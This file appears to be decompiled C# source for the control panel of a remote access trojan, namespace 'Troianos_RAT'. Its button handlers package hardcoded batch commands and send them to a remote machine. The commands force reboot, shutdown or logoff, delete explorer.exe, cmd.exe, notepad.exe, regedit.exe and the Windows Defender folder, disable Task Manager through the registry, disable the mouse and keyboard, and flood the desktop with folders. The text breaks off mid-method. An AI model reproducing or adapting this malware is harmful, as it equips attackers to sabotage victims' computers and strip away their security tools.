using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Troianos_RAT
{
	// Token: 0x0200001E RID: 30
	[DesignerGenerated]
	public partial class script : Form
	{
		// Token: 0x06000361 RID: 865 RVA: 0x001F8118 File Offset: 0x001F6518
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = script.__ENCList;
			lock (_ENCList)
			{
				bool flag = script.__ENCList.Count == script.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = script.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = script.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								script.__ENCList[num] = script.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					script.__ENCList.RemoveRange(num, script.__ENCList.Count - num);
					script.__ENCList.Capacity = script.__ENCList.Count;
				}
				script.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x06000364 RID: 868 RVA: 0x001F9388 File Offset: 0x001F7788
		// (set) Token: 0x06000365 RID: 869 RVA: 0x001F93A0 File Offset: 0x001F77A0
		internal virtual Button Button15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button15_Click);
				bool flag = this._Button15 != null;
				if (flag)
				{
					this._Button15.Click -= value2;
				}
				this._Button15 = value;
				flag = (this._Button15 != null);
				if (flag)
				{
					this._Button15.Click += value2;
				}
			}
		}

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x06000366 RID: 870 RVA: 0x001F9400 File Offset: 0x001F7800
		// (set) Token: 0x06000367 RID: 871 RVA: 0x001F9418 File Offset: 0x001F7818
		internal virtual Button Button16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button16_Click);
				bool flag = this._Button16 != null;
				if (flag)
				{
					this._Button16.Click -= value2;
				}
				this._Button16 = value;
				flag = (this._Button16 != null);
				if (flag)
				{
					this._Button16.Click += value2;
				}
			}
		}

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x06000368 RID: 872 RVA: 0x001F9478 File Offset: 0x001F7878
		// (set) Token: 0x06000369 RID: 873 RVA: 0x001F9490 File Offset: 0x001F7890
		internal virtual Button Button17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button17_Click);
				bool flag = this._Button17 != null;
				if (flag)
				{
					this._Button17.Click -= value2;
				}
				this._Button17 = value;
				flag = (this._Button17 != null);
				if (flag)
				{
					this._Button17.Click += value2;
				}
			}
		}

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x0600036A RID: 874 RVA: 0x001F94F0 File Offset: 0x001F78F0
		// (set) Token: 0x0600036B RID: 875 RVA: 0x001F9508 File Offset: 0x001F7908
		internal virtual Button Button18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button18_Click);
				bool flag = this._Button18 != null;
				if (flag)
				{
					this._Button18.Click -= value2;
				}
				this._Button18 = value;
				flag = (this._Button18 != null);
				if (flag)
				{
					this._Button18.Click += value2;
				}
			}
		}

		// Token: 0x1700011B RID: 283
		// (get) Token: 0x0600036C RID: 876 RVA: 0x001F9568 File Offset: 0x001F7968
		// (set) Token: 0x0600036D RID: 877 RVA: 0x001F9580 File Offset: 0x001F7980
		internal virtual Button Button19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button19_Click);
				bool flag = this._Button19 != null;
				if (flag)
				{
					this._Button19.Click -= value2;
				}
				this._Button19 = value;
				flag = (this._Button19 != null);
				if (flag)
				{
					this._Button19.Click += value2;
				}
			}
		}

		// Token: 0x1700011C RID: 284
		// (get) Token: 0x0600036E RID: 878 RVA: 0x001F95E0 File Offset: 0x001F79E0
		// (set) Token: 0x0600036F RID: 879 RVA: 0x001F95F8 File Offset: 0x001F79F8
		internal virtual Button Button20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button20_Click);
				bool flag = this._Button20 != null;
				if (flag)
				{
					this._Button20.Click -= value2;
				}
				this._Button20 = value;
				flag = (this._Button20 != null);
				if (flag)
				{
					this._Button20.Click += value2;
				}
			}
		}

		// Token: 0x1700011D RID: 285
		// (get) Token: 0x06000370 RID: 880 RVA: 0x001F9658 File Offset: 0x001F7A58
		// (set) Token: 0x06000371 RID: 881 RVA: 0x001F9670 File Offset: 0x001F7A70
		internal virtual Button Button21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button21_Click);
				bool flag = this._Button21 != null;
				if (flag)
				{
					this._Button21.Click -= value2;
				}
				this._Button21 = value;
				flag = (this._Button21 != null);
				if (flag)
				{
					this._Button21.Click += value2;
				}
			}
		}

		// Token: 0x1700011E RID: 286
		// (get) Token: 0x06000372 RID: 882 RVA: 0x001F96D0 File Offset: 0x001F7AD0
		// (set) Token: 0x06000373 RID: 883 RVA: 0x001F96E8 File Offset: 0x001F7AE8
		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button8_Click);
				bool flag = this._Button8 != null;
				if (flag)
				{
					this._Button8.Click -= value2;
				}
				this._Button8 = value;
				flag = (this._Button8 != null);
				if (flag)
				{
					this._Button8.Click += value2;
				}
			}
		}

		// Token: 0x1700011F RID: 287
		// (get) Token: 0x06000374 RID: 884 RVA: 0x001F9748 File Offset: 0x001F7B48
		// (set) Token: 0x06000375 RID: 885 RVA: 0x001F9760 File Offset: 0x001F7B60
		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button9_Click);
				bool flag = this._Button9 != null;
				if (flag)
				{
					this._Button9.Click -= value2;
				}
				this._Button9 = value;
				flag = (this._Button9 != null);
				if (flag)
				{
					this._Button9.Click += value2;
				}
			}
		}

		// Token: 0x17000120 RID: 288
		// (get) Token: 0x06000376 RID: 886 RVA: 0x001F97C0 File Offset: 0x001F7BC0
		// (set) Token: 0x06000377 RID: 887 RVA: 0x001F97D8 File Offset: 0x001F7BD8
		internal virtual Button Button10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button10_Click);
				bool flag = this._Button10 != null;
				if (flag)
				{
					this._Button10.Click -= value2;
				}
				this._Button10 = value;
				flag = (this._Button10 != null);
				if (flag)
				{
					this._Button10.Click += value2;
				}
			}
		}

		// Token: 0x17000121 RID: 289
		// (get) Token: 0x06000378 RID: 888 RVA: 0x001F9838 File Offset: 0x001F7C38
		// (set) Token: 0x06000379 RID: 889 RVA: 0x001F9850 File Offset: 0x001F7C50
		internal virtual Button Button11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button11_Click);
				bool flag = this._Button11 != null;
				if (flag)
				{
					this._Button11.Click -= value2;
				}
				this._Button11 = value;
				flag = (this._Button11 != null);
				if (flag)
				{
					this._Button11.Click += value2;
				}
			}
		}

		// Token: 0x17000122 RID: 290
		// (get) Token: 0x0600037A RID: 890 RVA: 0x001F98B0 File Offset: 0x001F7CB0
		// (set) Token: 0x0600037B RID: 891 RVA: 0x001F98C8 File Offset: 0x001F7CC8
		internal virtual Button Button12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button12_Click);
				bool flag = this._Button12 != null;
				if (flag)
				{
					this._Button12.Click -= value2;
				}
				this._Button12 = value;
				flag = (this._Button12 != null);
				if (flag)
				{
					this._Button12.Click += value2;
				}
			}
		}

		// Token: 0x17000123 RID: 291
		// (get) Token: 0x0600037C RID: 892 RVA: 0x001F9928 File Offset: 0x001F7D28
		// (set) Token: 0x0600037D RID: 893 RVA: 0x001F9940 File Offset: 0x001F7D40
		internal virtual Button Button13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button13_Click);
				bool flag = this._Button13 != null;
				if (flag)
				{
					this._Button13.Click -= value2;
				}
				this._Button13 = value;
				flag = (this._Button13 != null);
				if (flag)
				{
					this._Button13.Click += value2;
				}
			}
		}

		// Token: 0x17000124 RID: 292
		// (get) Token: 0x0600037E RID: 894 RVA: 0x001F99A0 File Offset: 0x001F7DA0
		// (set) Token: 0x0600037F RID: 895 RVA: 0x001F99B8 File Offset: 0x001F7DB8
		internal virtual Button Button14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button14_Click);
				bool flag = this._Button14 != null;
				if (flag)
				{
					this._Button14.Click -= value2;
				}
				this._Button14 = value;
				flag = (this._Button14 != null);
				if (flag)
				{
					this._Button14.Click += value2;
				}
			}
		}

		// Token: 0x17000125 RID: 293
		// (get) Token: 0x06000380 RID: 896 RVA: 0x001F9A18 File Offset: 0x001F7E18
		// (set) Token: 0x06000381 RID: 897 RVA: 0x001F9A30 File Offset: 0x001F7E30
		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				bool flag = this._Button7 != null;
				if (flag)
				{
					this._Button7.Click -= value2;
				}
				this._Button7 = value;
				flag = (this._Button7 != null);
				if (flag)
				{
					this._Button7.Click += value2;
				}
			}
		}

		// Token: 0x17000126 RID: 294
		// (get) Token: 0x06000382 RID: 898 RVA: 0x001F9A90 File Offset: 0x001F7E90
		// (set) Token: 0x06000383 RID: 899 RVA: 0x001F9AA8 File Offset: 0x001F7EA8
		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button6_Click);
				bool flag = this._Button6 != null;
				if (flag)
				{
					this._Button6.Click -= value2;
				}
				this._Button6 = value;
				flag = (this._Button6 != null);
				if (flag)
				{
					this._Button6.Click += value2;
				}
			}
		}

		// Token: 0x17000127 RID: 295
		// (get) Token: 0x06000384 RID: 900 RVA: 0x001F9B08 File Offset: 0x001F7F08
		// (set) Token: 0x06000385 RID: 901 RVA: 0x001F9B20 File Offset: 0x001F7F20
		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		// Token: 0x17000128 RID: 296
		// (get) Token: 0x06000386 RID: 902 RVA: 0x001F9B80 File Offset: 0x001F7F80
		// (set) Token: 0x06000387 RID: 903 RVA: 0x001F9B98 File Offset: 0x001F7F98
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				bool flag = this._Button4 != null;
				if (flag)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				flag = (this._Button4 != null);
				if (flag)
				{
					this._Button4.Click += value2;
				}
			}
		}

		// Token: 0x17000129 RID: 297
		// (get) Token: 0x06000388 RID: 904 RVA: 0x001F9BF8 File Offset: 0x001F7FF8
		// (set) Token: 0x06000389 RID: 905 RVA: 0x001F9C10 File Offset: 0x001F8010
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		// Token: 0x1700012A RID: 298
		// (get) Token: 0x0600038A RID: 906 RVA: 0x001F9C70 File Offset: 0x001F8070
		// (set) Token: 0x0600038B RID: 907 RVA: 0x001F9C88 File Offset: 0x001F8088
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x1700012B RID: 299
		// (get) Token: 0x0600038C RID: 908 RVA: 0x001F9CE8 File Offset: 0x001F80E8
		// (set) Token: 0x0600038D RID: 909 RVA: 0x001F9D00 File Offset: 0x001F8100
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_1);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700012C RID: 300
		// (get) Token: 0x0600038E RID: 910 RVA: 0x001F9D60 File Offset: 0x001F8160
		// (set) Token: 0x0600038F RID: 911 RVA: 0x001F9D78 File Offset: 0x001F8178
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x06000390 RID: 912 RVA: 0x001F9D84 File Offset: 0x001F8184
		public script()
		{
			script.__ENCAddToList(this);
			this.RunAs = "bat";
			this.Code = string.Empty;
			this.InitializeComponent();
		}

		// Token: 0x06000391 RID: 913 RVA: 0x001F9DB4 File Offset: 0x001F81B4
		private void Button1_Click_1(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\n\r\ncls\r\nshutdown -r -t 1";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000392 RID: 914 RVA: 0x001F9E98 File Offset: 0x001F8298
		private void Button2_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\n\r\ncls\r\nshutdown -s -t 1";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000393 RID: 915 RVA: 0x001F9F7C File Offset: 0x001F837C
		private void Button3_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\n\r\ncls\r\nshutdown -l -t 1";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000394 RID: 916 RVA: 0x001FA060 File Offset: 0x001F8460
		private void Button4_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@ECHO OFF\r\nCD\\\r\nCD WINDOWS\r\nDEL /s /q explorer.exe\r\ncls\r\nEXIT";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000395 RID: 917 RVA: 0x001FA144 File Offset: 0x001F8544
		private void Button5_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nDEL C:\\Windows\\System32\\notepad.exe";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000396 RID: 918 RVA: 0x001FA228 File Offset: 0x001F8628
		private void Button6_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nDEL C:\\Windows\\System32\\cmd.exe";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000397 RID: 919 RVA: 0x001FA30C File Offset: 0x001F870C
		private void Button7_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nDEL C:\\Program Files\\Windows Defender";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000398 RID: 920 RVA: 0x001FA3F0 File Offset: 0x001F87F0
		private void Button14_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@ECHO OFF\r\nCD %userprofile%\\Desktop\r\nSET NumeroDePastas=30000\r\nSET /a Nome=Vírus\r\n:3\r\nIF EXIST %NumeroDePastas% GOTO 4\r\nSET /a Nome=%Nome%+1\r\nMD %Nome%\r\nGOTO 3\r\n:4\r\nEXIT";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x06000399 RID: 921 RVA: 0x001FA4D4 File Offset: 0x001F88D4
		private void Button13_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\n\r\ncls\r\n@echo off\r\n@echo off\r\nSTART explorer.exe\r\nCLS\r\nGOTO funcao";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039A RID: 922 RVA: 0x001FA5B8 File Offset: 0x001F89B8
		private void Button12_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nTASKKILL /F /IM EXPLORER.EXE";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039B RID: 923 RVA: 0x001FA69C File Offset: 0x001F8A9C
		private void Button11_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\n\r\ncls\r\n@echo off\r\nrundll32 USER32.DLL,SwapMouseButton";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039C RID: 924 RVA: 0x001FA780 File Offset: 0x001F8B80
		private void Button10_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_SZ /d 1 /f > nul";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039D RID: 925 RVA: 0x001FA864 File Offset: 0x001F8C64
		private void Button9_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\nrundll32 mouse,disable\r\nrundll32 keyboard,disable";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				byte[] buffer = Class6.smethod_11(ref text);
				int offset = 0;
				string text2 = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
				memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
				memoryStream.Write(array, 0, array.Length);
				Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
				thread.Start(new object[]
				{
					memoryStream.ToArray()
				});
			}
		}

		// Token: 0x0600039E RID: 926 RVA: 0x001FA948 File Offset: 0x001F8D48
		private void Button8_Click(object sender, EventArgs e)
		{
			this.Code = "@echo off\r\ncls\r\n@echo off\r\nDEL C:\\Windows\\System32\\regedit.exe";
			this.RunAs = "bat";
			bool flag = this.Code.Length > 0;
			if (flag)
			{
				bool flag2 = true;
				byte[] array = Class6.smethod_8(Class6.smethod_11(ref this.Code), ref flag2);
				MemoryStream memoryStream = new MemoryStream();
				MemoryStream memoryStream2 = memoryStream;
				string text = "rn" + Class7.string_1 + this.RunAs + Class7.string_1;
